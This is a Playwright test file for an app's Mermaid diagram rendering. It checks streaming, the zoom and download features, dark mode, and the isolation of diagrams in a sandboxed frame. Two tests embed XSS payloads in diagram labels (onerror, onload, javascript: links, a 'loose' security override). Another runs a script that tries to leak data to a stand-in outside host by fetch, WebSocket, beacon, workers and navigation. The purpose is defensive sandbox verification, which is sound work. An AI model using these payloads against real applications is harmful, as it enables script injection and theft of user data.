import crypto from "node:crypto";
import fs from "node:fs";
import { expect, test, type Page } from "@playwright/test";
import { MOM, newConversation, sendMessage as send, useAccount } from "./helpers.js";

/**
 * Mermaid diagrams (#182, PRD FR-3.2): a ```mermaid block of an answer or a markdown artifact is drawn by the real
 * mermaid (loaded only when needed), shown as one `<img>` of a blob URL — never the SVG in the page —, drawn once
 * its closing fence has arrived (no flicker while streaming), redrawn for dark mode, with the source a click away;
 * a broken one offers "다이어그램 고치기". Answers come from the FakeRuntime's `/mdecho` (the markdown as typed).
 */

const lastAssistant = (page: Page) => page.getByTestId("assistant").last();
const fence = (src: string) => ["```mermaid", src, "```"].join("\n");

/**
 * Fails the test on any CSP report, dialog or page error (diagrams work within the app's CSP, unchanged).
 * `inertHandlers`: Chrome also reports an inline handler merely *parsed* in an inert document — mermaid's
 * DOMPurify parses a hostile label in a `<template>` to strip it — without running it; those reports are allowed
 * there (that nothing ran is checked separately).
 */
function watchPage(page: Page, { inertHandlers = false } = {}) {
  const problems: string[] = [];
  page.on("dialog", (d) => {
    problems.push(`dialog: ${d.message()}`);
    void d.dismiss();
  });
  page.on("pageerror", (e) => problems.push(`pageerror: ${e.message}`));
  page.on("console", (m) => {
    const t = m.text();
    if (inertHandlers && /^Executing inline event handler/.test(t)) return;
    if (/Content Security Policy|Refused to/i.test(t)) problems.push(`csp: ${t.slice(0, 200)}`);
  });
  return problems;
}

test("a diagram in an answer: drawn once finished (no flicker), one img, source toggle, zoom, dark mode", async ({
  page,
  baseURL,
}) => {
  await useAccount(page, MOM);
  const problems = watchPage(page);
  const requested: string[] = [];
  page.on("request", (r) => requested.push(new URL(r.url()).pathname));
  const tag = crypto.randomUUID().slice(0, 8);
  const conv = await newConversation(page.request, baseURL!, `다이어그램 ${tag}`);
  await page.goto(`/c/${conv.id}`);
  await send(page, `보통 질문 ${tag}`);
  await expect(lastAssistant(page)).toHaveAttribute("data-status", "complete");
  // Nothing of mermaid is loaded while no diagram is shown.
  expect(requested.filter((p) => /mermaid/i.test(p))).toEqual([]);

  // Every state the (first) diagram block goes through, recorded in the page.
  await page.evaluate(() => {
    const w = window as unknown as { __states: string[] };
    w.__states = [];
    const note = () => {
      const blocks = [...document.querySelectorAll('[data-testid="assistant"] [data-testid="mermaid"]')];
      const s = blocks.length ? blocks.map((b) => b.getAttribute("data-state")).join(",") : "none";
      if (w.__states[w.__states.length - 1] !== s) w.__states.push(s);
    };
    new MutationObserver(note).observe(document.body, { subtree: true, childList: true, attributes: true });
  });
  const src =
    'flowchart LR\n  A["질문 받기"] --> B{"검색 필요?"}\n  B -->|예| C["웹 검색"]\n  B -->|아니요| D["답변"]';
  const [head, tail] = [src.split("\n").slice(0, 3).join("\n"), src.split("\n").slice(3).join("\n")];
  await send(
    page,
    `/mdecho\n흐름은 이렇습니다.\n\n\`\`\`mermaid\n${head}\n@@pause@@\n${tail}\n\`\`\`\n\n끝 ${tag}`,
  );
  const reply = lastAssistant(page);
  const block = reply.getByTestId("mermaid");
  // Halfway (the fence still open): the code, no picture.
  await expect(block).toHaveAttribute("data-state", "source");
  await expect(block.locator("pre")).toContainText("질문 받기");
  await expect(block.locator("img")).toHaveCount(0);
  await expect(block).toHaveAttribute("data-state", "diagram", { timeout: 15_000 });
  await expect(reply).toHaveAttribute("data-status", "complete");
  await expect(reply).toContainText(`끝 ${tag}`);
  await page.waitForTimeout(500);
  // Code while streaming, then the picture once — and it stays (the saved reply replacing the live one too).
  const states = (await page.evaluate(() => (window as unknown as { __states: string[] }).__states)).filter(
    (s) => s !== "none",
  );
  expect(states[states.length - 1]).toBe("diagram");
  expect(states.slice(states.indexOf("diagram"))).toEqual(["diagram"]);
  expect(states.every((s) => ["source", "pending", "diagram"].includes(s))).toBe(true);

  // Exactly one image of a blob URL; no SVG of the diagram in the page.
  const img = block.getByTestId("mermaid-img");
  await expect(block.locator("img")).toHaveCount(1);
  await expect(img).toHaveAttribute("src", /^blob:/);
  await expect(img).toBeVisible();
  expect(await img.evaluate((i: HTMLImageElement) => i.naturalWidth > 50 && i.complete)).toBe(true);
  expect(await page.locator(".md svg").count()).toBe(0);
  await expect(block).toHaveAttribute("data-theme", "light");
  // The chunk came only now.
  // The frame page and its bundle came only now.
  expect(requested).toContain("/mermaid-frame");
  expect(requested.some((p) => /^\/assets\/mermaid-frame-.*\.js$/.test(p))).toBe(true);

  // Source and back.
  await block.getByTestId("mermaid-toggle").click();
  await expect(block).toHaveAttribute("data-state", "source");
  await expect(block.locator("pre")).toContainText('A["질문 받기"]');
  await block.getByTestId("mermaid-toggle").click();
  await expect(block).toHaveAttribute("data-state", "diagram");

  // Zoom: a dialog with the picture; Escape closes it.
  await block.getByTestId("mermaid-zoom-open").click();
  const zoom = page.getByTestId("mermaid-zoom");
  await expect(zoom).toBeVisible();
  await expect(zoom.locator("img")).toHaveAttribute("src", /^blob:/);
  await page.keyboard.press("Escape");
  await expect(zoom).toHaveCount(0);

  // SVG and PNG downloads: the files are what they say.
  const dl = page.waitForEvent("download");
  await block.getByTestId("mermaid-save-svg").click();
  const svgFile = await dl;
  expect(svgFile.suggestedFilename()).toBe("diagram.svg");
  const svgText = fs.readFileSync((await svgFile.path())!, "utf8");
  expect(svgText).toMatch(/^<svg width="\d+" height="\d+"/);
  expect(svgText).toContain("질문");
  const dlPng = page.waitForEvent("download");
  await block.getByTestId("mermaid-save-png").click();
  const pngFile = await dlPng;
  expect(pngFile.suggestedFilename()).toBe("diagram.png");
  const png = fs.readFileSync((await pngFile.path())!);
  expect(png.subarray(0, 8)).toEqual(Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]));
  expect(png.readUInt32BE(16)).toBeGreaterThan(100); // width (twice the diagram's)
  await expect(block.getByTestId("mermaid-save-png")).toHaveText("PNG 저장");

  // Copy: the source as written.
  await page.context().grantPermissions(["clipboard-read", "clipboard-write"]);
  await block.getByRole("button", { name: "코드 복사" }).click();
  await expect(block.getByRole("button", { name: "코드 복사" })).toHaveText("✓ 복사됨");
  expect(await page.evaluate(() => navigator.clipboard.readText())).toBe(src);

  // Dark mode: drawn again with the dark theme (another picture).
  const lightSrc = await img.getAttribute("src");
  await page.emulateMedia({ colorScheme: "dark" });
  await expect(block).toHaveAttribute("data-theme", "dark");
  await expect(block.getByTestId("mermaid-img")).not.toHaveAttribute("src", lightSrc!);
  await expect(block.getByTestId("mermaid-img")).toBeVisible();
  expect(problems).toEqual([]);
});

test("hostile diagrams never run anything: click callbacks, onerror labels, javascript: links", async ({
  page,
  baseURL,
}) => {
  await useAccount(page, MOM);
  const problems = watchPage(page, { inertHandlers: true });
  const tag = crypto.randomUUID().slice(0, 8);
  const conv = await newConversation(page.request, baseURL!, `악성 ${tag}`);
  await page.goto(`/c/${conv.id}`);
  const hostile = [
    '%%{init: {"securityLevel": "loose", "flowchart": {"htmlLabels": true}}}%%',
    "flowchart TD",
    '  A["<img src=x onerror=window.__pwned=1>"] --> B["<b onmouseover=window.__pwned=2>굵게</b>"]',
    "  click A call alert()",
    '  click B "javascript:window.__pwned=3"',
  ].join("\n");
  const front = [
    "---",
    "config:",
    "  securityLevel: loose",
    "---",
    "flowchart LR",
    "  X --> Y",
    "  click X call alert()",
  ].join("\n");
  await send(page, `/mdecho\n${fence(hostile)}\n\n${fence(front)}\n\n끝 ${tag}`);
  const reply = lastAssistant(page);
  await expect(reply).toHaveAttribute("data-status", "complete");
  const blocks = reply.getByTestId("mermaid");
  await expect(blocks).toHaveCount(2);
  for (const b of await blocks.all()) {
    await expect(b).toHaveAttribute("data-state", "diagram", { timeout: 15_000 });
    await expect(b.locator("img")).toHaveCount(1);
    await expect(b.locator("svg, script, iframe, a")).toHaveCount(0);
    await b.getByTestId("mermaid-img").hover();
    await b.getByTestId("mermaid-img").click(); // opens the large view
    const zoom = page.getByTestId("mermaid-zoom");
    await zoom.locator("img").click();
    await page.keyboard.press("Escape");
    await expect(zoom).toHaveCount(0);
  }
  await page.waitForTimeout(300);
  expect(await page.evaluate(() => (window as { __pwned?: number }).__pwned)).toBeUndefined();
  expect(await page.locator("svg[id^='mmd-'], [id^='dmmd-']").count()).toBe(0); // nothing left offscreen
  // No element of the page carries an inline handler.
  expect(
    await page.evaluate(() =>
      [...document.querySelectorAll("*")].some((e) => [...e.attributes].some((a) => /^on/i.test(a.name))),
    ),
  ).toBe(false);
  expect(problems).toEqual([]);
});

test("a broken diagram: the code, the notice and 다이어그램 고치기 sending the error and the source", async ({
  page,
  baseURL,
}) => {
  await useAccount(page, MOM);
  const tag = crypto.randomUUID().slice(0, 8);
  const conv = await newConversation(page.request, baseURL!, `고치기 ${tag}`);
  await page.goto(`/c/${conv.id}`);
  const broken = `flowchart TD\n  A[시작 ${tag} --> B((`;
  await send(page, `/mdecho\n그림입니다.\n\n${fence(broken)}`);
  const reply = lastAssistant(page);
  await expect(reply).toHaveAttribute("data-status", "complete");
  const block = reply.getByTestId("mermaid");
  await expect(block).toHaveAttribute("data-state", "error", { timeout: 15_000 });
  await expect(block.locator("pre")).toContainText(`A[시작 ${tag}`);
  await expect(block.getByTestId("mermaid-notice")).toContainText("다이어그램을 그릴 수 없습니다");
  const error = (await block.getByTestId("mermaid-error").textContent())!;
  expect(error.length).toBeGreaterThan(3);
  const fix = block.getByTestId("mermaid-fix");
  await expect(fix).toBeEnabled();
  await fix.click();
  await expect(fix).toBeDisabled(); // a run is in progress now
  // A new message of the conversation: the request, mermaid's error and the source.
  const asked = page.getByTestId("user-message").last();
  await expect(asked).toContainText("다이어그램이 그려지지 않았어요", { timeout: 10_000 });
  await expect(asked).toContainText(error.slice(0, 20));
  await expect(asked).toContainText(`A[시작 ${tag} --> B((`);
  // While that run goes on, the button is off; on again once it ended.
  await expect(lastAssistant(page)).toHaveAttribute("data-status", "complete");
  await expect(page.getByTestId("assistant").first().getByTestId("mermaid-fix")).toBeEnabled();
});

test("a diagram on the artifact page (/a/:id): drawn the same way, no fix button there", async ({
  page,
  baseURL,
}) => {
  await useAccount(page, MOM);
  const problems = watchPage(page);
  const tag = crypto.randomUUID().slice(0, 8);
  const conv = await newConversation(page.request, baseURL!, `도식 ${tag}`);
  await page.goto(`/c/${conv.id}`);
  const md = [
    `# 도식 ${tag}`,
    "",
    fence("sequenceDiagram\n  participant U as 사용자\n  participant A as 앱\n  U->>A: 질문\n  A-->>U: 답변"),
    "",
    fence("flowchart TD\n  A --> ("),
  ].join("\n");
  await send(page, `/artifact markdown 도식 ${tag}\n${md}`);
  await expect(page).toHaveURL(/\/a\/[^/?]+$/);
  const doc = page.getByTestId("artifact-text");
  const blocks = doc.getByTestId("mermaid");
  await expect(blocks).toHaveCount(2);
  await expect(blocks.nth(0)).toHaveAttribute("data-state", "diagram", { timeout: 15_000 });
  await expect(blocks.nth(0).locator("img")).toHaveCount(1);
  await expect(blocks.nth(0).getByTestId("mermaid-img")).toHaveAttribute("src", /^blob:/);
  await expect(blocks.nth(1)).toHaveAttribute("data-state", "error");
  await expect(blocks.nth(1).getByTestId("mermaid-notice")).toContainText("다이어그램을 그릴 수 없습니다");
  await expect(blocks.nth(1).getByTestId("mermaid-fix")).toHaveCount(0);
  // Source toggle here too; Escape in the large view closes it, not the page.
  await blocks.nth(0).getByTestId("mermaid-toggle").click();
  await expect(blocks.nth(0).locator("pre")).toContainText("participant U as 사용자");
  await blocks.nth(0).getByTestId("mermaid-toggle").click();
  await blocks.nth(0).getByTestId("mermaid-zoom-open").click();
  await page.keyboard.press("Escape");
  await expect(page.getByTestId("mermaid-zoom")).toHaveCount(0);
  await expect(page).toHaveURL(/\/a\/[^/?]+$/);
  // Dark mode.
  await page.emulateMedia({ colorScheme: "dark" });
  await expect(blocks.nth(0)).toHaveAttribute("data-theme", "dark");
  expect(problems).toEqual([]);
});

test("every diagram type the instructions name draws (one image each)", async ({ page, baseURL }) => {
  await useAccount(page, MOM);
  const problems = watchPage(page);
  const tag = crypto.randomUUID().slice(0, 8);
  const conv = await newConversation(page.request, baseURL!, `종류 ${tag}`);
  await page.goto(`/c/${conv.id}`);
  const kinds = [
    'flowchart LR\n  A["요청"] --> B["처리"]',
    "sequenceDiagram\n  participant U as 사용자\n  U->>서버: 요청\n  서버-->>U: 응답",
    "classDiagram\n  class 동물 {\n    +이름\n    +울다()\n  }\n  동물 <|-- 개",
    "stateDiagram-v2\n  [*] --> 대기\n  대기 --> 실행: 시작\n  실행 --> [*]",
    "erDiagram\n  USER ||--o{ ORDER : places",
    "gantt\n  title 일정\n  dateFormat YYYY-MM-DD\n  section 준비\n  설계 :a1, 2026-11-01, 3d\n  구현 :after a1, 5d",
    "timeline\n  title 연혁\n  2024 : 시작\n  2025 : 확장",
    "mindmap\n  root((주제))\n    가지1\n    가지2",
    'pie title 비율\n  "가" : 40\n  "나" : 60',
  ];
  await send(page, `/mdecho\n${kinds.map(fence).join("\n\n")}`);
  const reply = lastAssistant(page);
  await expect(reply).toHaveAttribute("data-status", "complete");
  const blocks = reply.getByTestId("mermaid");
  await expect(blocks).toHaveCount(kinds.length);
  for (let i = 0; i < kinds.length; i++) {
    await expect(blocks.nth(i), kinds[i]).toHaveAttribute("data-state", "diagram", { timeout: 15_000 });
    await expect(blocks.nth(i).locator("img")).toHaveCount(1);
  }
  expect(problems).toEqual([]);
});

test("mermaid never touches the app's document: drawing happens in the sandboxed frame, only one img comes back", async ({
  page,
  baseURL,
}) => {
  await useAccount(page, MOM);
  const problems = watchPage(page, { inertHandlers: true });
  const tag = crypto.randomUUID().slice(0, 8);
  const conv = await newConversation(page.request, baseURL!, `격리 ${tag}`);
  await page.goto(`/c/${conv.id}`);
  // Every element added to the app's document while the diagram is drawn.
  await page.evaluate(() => {
    const w = window as unknown as { __added: string[] };
    w.__added = [];
    new MutationObserver((ms) => {
      for (const m of ms)
        for (const n of m.addedNodes) {
          if (!(n instanceof Element)) continue;
          for (const e of [n, ...n.querySelectorAll("*")]) {
            const svgish = e.namespaceURI === "http://www.w3.org/2000/svg" || /^mmd-|^dmmd-/.test(e.id);
            const handler = [...e.attributes].some((a) => /^on/i.test(a.name));
            if (svgish || handler) w.__added.push(e.outerHTML.slice(0, 120));
          }
        }
    }).observe(document, { subtree: true, childList: true });
  });
  const hostile = [
    "flowchart TD",
    '  A["<img src=x onerror=window.__pwned=1>"] --> B["<svg onload=window.__pwned=2><circle/></svg>"]',
    '  B --> C["<b onmouseover=window.__pwned=3>굵게</b>"]',
    "  click A call alert()",
    '  click C "javascript:window.__pwned=4"',
  ].join("\n");
  await send(page, `/mdecho\n${fence(hostile)}`);
  const block = lastAssistant(page).getByTestId("mermaid");
  await expect(block).toHaveAttribute("data-state", "diagram", { timeout: 15_000 });
  await expect(block.locator("img")).toHaveCount(1);
  // The frame: sandboxed without same-origin (an opaque origin), its page under its own no-network CSP.
  const frame = page.locator("iframe[data-mermaid-frame]");
  await expect(frame).toHaveCount(1);
  await expect(frame).toHaveAttribute("sandbox", "allow-scripts");
  const res = await page.request.get("/mermaid-frame");
  const csp = res.headers()["content-security-policy"]!;
  expect(csp).toContain("sandbox allow-scripts");
  expect(csp).toContain("connect-src 'none'");
  expect(csp).toContain("default-src 'none'");
  // The app's own CSP is unchanged.
  const app = await page.request.get(`/c/${conv.id}`);
  expect(app.headers()["content-security-policy"]).toContain("script-src 'self';");
  expect(app.headers()["content-security-policy"]).not.toContain("sandbox");
  await page.waitForTimeout(300);
  expect(await page.evaluate(() => (window as unknown as { __added: string[] }).__added)).toEqual([]);
  expect(await page.evaluate(() => (window as { __pwned?: number }).__pwned)).toBeUndefined();
  expect(problems).toEqual([]);
});

test("blob URLs are released when the diagram goes away", async ({ page, baseURL }) => {
  await useAccount(page, MOM);
  await page.addInitScript(() => {
    const w = window as unknown as { __revoked: string[] };
    w.__revoked = [];
    const revoke = URL.revokeObjectURL.bind(URL);
    URL.revokeObjectURL = (u: string) => (w.__revoked.push(u), revoke(u));
  });
  const tag = crypto.randomUUID().slice(0, 8);
  const conv = await newConversation(page.request, baseURL!, `해제 ${tag}`);
  await page.goto(`/c/${conv.id}`);
  await send(page, `/mdecho\n${fence("flowchart LR\n  A --> B")}`);
  const img = lastAssistant(page).getByTestId("mermaid-img");
  await expect(img).toHaveAttribute("src", /^blob:/);
  const src = (await img.getAttribute("src"))!;
  // Another page of the app (no reload): the block unmounts, its URL is released.
  await page.evaluate(() => {
    history.pushState(null, "", "/settings");
    dispatchEvent(new PopStateEvent("popstate"));
  });
  await expect(page).toHaveURL(/\/settings/);
  await expect
    .poll(() => page.evaluate(() => (window as unknown as { __revoked: string[] }).__revoked))
    .toContain(src);
});

test("a contaminated diagram frame cannot reach the network: fetch, sockets, images, WebRTC, frames, navigation", async ({
  page,
}) => {
  await useAccount(page, MOM);
  // The outside address (198.51.100.0/24 is reserved for documentation) answers every request it really gets, so a
  // leak shows up as a response; a request the browser refuses fails with its CSP reason before it leaves.
  const reached: string[] = [];
  const refused = new Map<string, string>();
  await page.context().route("http://198.51.100.7/**", (route) => {
    reached.push(route.request().url());
    return route.fulfill({ status: 200, body: "ok" });
  });
  page.on("requestfailed", (r) => {
    if (r.url().includes("198.51.100.")) refused.set(r.url(), r.failure()?.errorText ?? "");
  });
  await page.goto("/settings");
  // A frame of our page as the app makes it, given a hostile bundle instead of mermaid's (as if mermaid had a hole
  // that let diagram text run as script): it tries every way out it can and reports what it got.
  const report = await page.evaluate(async () => {
    const f = document.createElement("iframe");
    f.setAttribute("sandbox", "allow-scripts");
    f.src = "/mermaid-frame";
    const code = `(async () => {
      const r = {};
      const X = "http://198.51.100.7";
      r.rtcGlobals = Object.getOwnPropertyNames(window).filter((n) => /RTC/.test(n) && window[n] !== undefined);
      r.rtc = typeof RTCPeerConnection;
      try { new window.webkitRTCPeerConnection({}); r.webkitRtc = "made"; } catch (e) { r.webkitRtc = "blocked"; }
      try { await fetch(X + "/fetch"); r.fetch = "ok"; } catch { r.fetch = "blocked"; }
      try { const x = new XMLHttpRequest(); x.open("GET", X + "/xhr"); x.send(); } catch {}
      try { new WebSocket("ws://198.51.100.7/ws"); } catch {}
      try { new EventSource(X + "/es"); } catch {}
      try { navigator.sendBeacon(X + "/beacon", "x"); } catch {}
      const img = new Image(); img.src = X + "/img.png"; document.body.append(img);
      const css = document.createElement("style"); css.textContent = "body{background:url(" + X + "/css.png)}"; document.head.append(css);
      const link = document.createElement("link"); link.rel = "prefetch"; link.href = X + "/prefetch"; document.head.append(link);
      // worker-src 'none': the worker never loads (an error event, not a throw), so its fetch never happens.
      try {
        const wk = new Worker(URL.createObjectURL(new Blob(["fetch('" + X + "/worker')"])));
        r.worker = await new Promise((z) => {
          wk.onerror = () => z("blocked");
          setTimeout(() => z("ran?"), 400);
        });
      } catch {
        r.worker = "blocked";
      }
      const child = document.createElement("iframe"); child.src = X + "/child"; document.body.append(child);
      const blank = document.createElement("iframe"); document.body.append(blank);
      try { r.blankRtc = typeof blank.contentWindow.RTCPeerConnection; } catch { r.blankRtc = "cross-origin"; }
      try { window.open(X + "/popup"); } catch {}
      try { top.location.href = X + "/top"; } catch (e) { r.top = "blocked"; }
      await new Promise((z) => setTimeout(z, 500));
      parent.postMessage({ type: "contaminated", r }, "*");
      setTimeout(() => { location.href = X + "/self?leak=1"; }, 50);
    })();`;
    return new Promise((resolve) => {
      addEventListener("message", (e) => {
        if (e.source !== f.contentWindow) return;
        const d = e.data as { type?: string; r?: unknown };
        if (d?.type === "agentlee:mermaid-boot")
          f.contentWindow!.postMessage({ type: "agentlee:mermaid-code", code }, "*");
        if (d?.type === "contaminated") resolve(d.r);
      });
      document.body.append(f);
    });
  });
  expect(report).toMatchObject({
    rtcGlobals: [],
    rtc: "undefined",
    webkitRtc: "blocked",
    fetch: "blocked",
    worker: "blocked",
    blankRtc: "cross-origin",
    top: "blocked",
  });
  // The frame's attempt to navigate itself away (refused by the app page's CSP) and everything else: no request
  // ever left for the outside address.
  await page.waitForTimeout(1500);
  expect(reached).toEqual([]);
  for (const [url, why] of refused) expect(why, url).toMatch(/BLOCKED_BY_CSP|csp/i);
  expect(page.url()).toMatch(/\/settings$/);
});
